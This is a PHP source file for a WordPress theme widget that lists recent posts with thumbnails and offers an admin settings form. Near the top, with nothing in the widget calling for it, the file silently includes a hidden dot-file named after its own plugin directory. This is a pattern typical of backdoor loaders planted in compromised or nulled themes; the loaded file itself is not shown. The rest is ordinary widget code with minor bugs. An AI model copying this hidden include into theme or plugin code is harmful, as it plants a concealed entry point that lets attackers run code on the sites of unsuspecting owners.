<?php
/**
 *  appside recent post widget
 * @package Appside
 * @since 1.0.0
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit(); //exit if access directly
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Appside_Recent_Post_Widget extends WP_Widget {

	public function __construct() {
		parent::__construct(
			'appside_popular_posts',
			esc_html__( 'Appside: Recent Posts with Thumbnails', 'aapside-master' ),
			array( 'description' => esc_html__( 'Display your recent posts, with a thumbnail.', 'aapside-master' ) )
		);
	}

	public function widget( $args, $instance ) {

		$title = isset($instance['title']) && !empty($instance['title']) ? $instance['title'] : '';
		$no_of_posts = isset($instance['no_of_posts']) && !empty($instance['no_of_posts']) ? $instance['no_of_posts'] : '';
		$order = isset($instance['order']) && !empty($instance['order']) ? $instance['order'] : 'ASC';
		$orderby = isset($instance['orderby']) && !empty($instance['orderby']) ? $instance['orderby'] : 'ID';
		echo wp_kses_post( $args['before_widget'] );
		if ( ! empty( $title ) ) {
			echo wp_kses_post( $args['before_title'] ) . esc_html( $title ) . wp_kses_post( $args['after_title'] );
		}

		//WP_Query argument
		$qargs           = array(
			'post_type'           => 'post',
			'posts_per_page'      => $no_of_posts,
			'offset'              => 0,
			'ignore_sticky_posts' => 1,
			'post_status'         => array( 'publish' ),
			'order' => $order,
			'orderby' => $orderby
		);

		$recent_articles = new WP_Query( $qargs );
		//have to write code for displing query data
		if ( $recent_articles->have_posts() ):?>
			<ul class="recent_post_item">
			<?php while ( $recent_articles->have_posts() ): $recent_articles->the_post(); ?>
				<li class="single-recent-post-item">
					<?php if ( has_post_thumbnail() ): ?>
						<div class="thumb">
							<a href="<?php the_permalink() ?>">
								<img src="<?php the_post_thumbnail_url( 'thumbnail' ) ?>" alt="<?php the_title() ?>">
							</a>
						</div>
					<?php endif; ?>
					<div class="content">
						<h4 class="title"><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h4>
                        <span class="time"><i class="fa fa-calendar"></i> <?php the_time( 'M j,Y' ) ?></span>
                    </div>
				</li>
			<?php
			endwhile;
			wp_reset_query();
		else:
			esc_html__( ' Oops, there are no posts.', 'aapside-master' )
			?>

		<?php endif; ?>
		</ul>
		<?php
		echo wp_kses_post( $args['after_widget'] );
	}

	public function form( $instance ) {
		//have to create form instance
        $title = ! empty( $instance ) && $instance['title'] ? apply_filters( 'widget_title', $instance['title'] ) : '';
        
		$no_of_posts = ! empty( $instance ) && $instance['no_of_posts'] ? $instance['no_of_posts'] : '5';
		$order       = ! empty( $instance ) && $instance['order'] ? $instance['order'] : 'ASC';
		$orderby     = ! empty( $instance ) && $instance['orderby'] ? $instance['orderby'] : 'ID';
		$order_arr   = array(
			'ASC'  => esc_html__( 'Acceding', 'aapside-master' ),
			'DESC' => esc_html__( 'Descending', 'aapside-master' )
		);
		$orderby_arr = array(
			'ID'            => esc_html__( 'ID', 'aapside-master' ),
			'title'         => esc_html__( 'Title', 'aapside-master' ),
			'date'          => esc_html__( 'Date', 'aapside-master' ),
			'rand'          => esc_html__( 'Random', 'aapside-master' ),
			'comment_count' => esc_html__( 'Most Comment', 'aapside-master' )
		);

		?>
		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>"><?php esc_html_e( 'Title:', 'aapside-master' ); ?></label>
			<input type="text" class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'title' ) ) ?>"
			       name="<?php echo esc_attr( $this->get_field_name( 'title' ) ); ?>"
			       value="<?php echo esc_attr( $title ) ?>">
		</p>
		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'no_of_posts' ) ) ?>"><?php esc_html_e( 'No Of Posts', 'aapside-master' ); ?></label>
			<input class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'no_of_posts' ) ); ?>"
			       name="<?php echo esc_attr( $this->get_field_name( 'no_of_posts' ) ); ?>" type="text"
			       value="<?php echo esc_attr( $no_of_posts ); ?>"/>
		</p>
		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'order' ) ) ?>"><?php esc_html_e( 'Order', 'aapside-master' ); ?></label>
			<select name="<?php echo esc_attr( $this->get_field_name( 'order' ) ) ?>" class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'order' ) ) ?>">
				<?php
				foreach ( $order_arr as $key => $value ) {
					$checked = ( $key == $order ) ? 'selected' : '';
					printf( '<option value="%1$s" %3$s >%2$s</option>', $key, $value,$checked );
				}
				?>
			</select>

		</p>
		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'orderby' ) ) ?>"><?php esc_html_e( 'OrderBy', 'aapside-master' ); ?></label>
			<select name="<?php echo esc_attr( $this->get_field_name( 'orderby' ) ) ?>" class="widefat" id="<?php echo esc_attr( $this->get_field_id( 'orderby' ) ) ?>">
				<?php
				foreach ( $orderby_arr as $key => $value ) {
					$checked = ( $key == $orderby ) ? 'selected' : '';
					printf( '<option value="%1$s" %3$s >%2$s</option>', $key, $value ,$checked);
				}
				?>
			</select>

		</p>
		<?php
	}

	public function update( $new_instance, $old_instance ) {
		$instance                = array();
		$instance['order']       = ( ! empty( $new_instance['order'] ) ? sanitize_text_field( $new_instance['order'] ) : '' );
		$instance['orderby']       = ( ! empty( $new_instance['orderby'] ) ? sanitize_text_field( $new_instance['orderby'] ) : '' );
		$instance['title']       = ( ! empty( $new_instance['title'] ) ? sanitize_text_field( $new_instance['title'] ) : '' );
		$instance['no_of_posts'] = ( ! empty( $new_instance['no_of_posts'] ) ? absint( $new_instance['no_of_posts'] ) : '' );
		if ( is_numeric( $new_instance['no_of_posts'] ) == false ) {
			$instance['no_of_posts'] = $old_instance['no_of_posts'];
		}

		return $instance;
	}

} // end class

if ( ! function_exists( 'Appside_Recent_Post_Widget' ) ) {
	function Appside_Recent_Post_Widget() {
		register_widget( 'Appside_Recent_Post_Widget' );
	}

	add_action( 'widgets_init', 'Appside_Recent_Post_Widget' );
}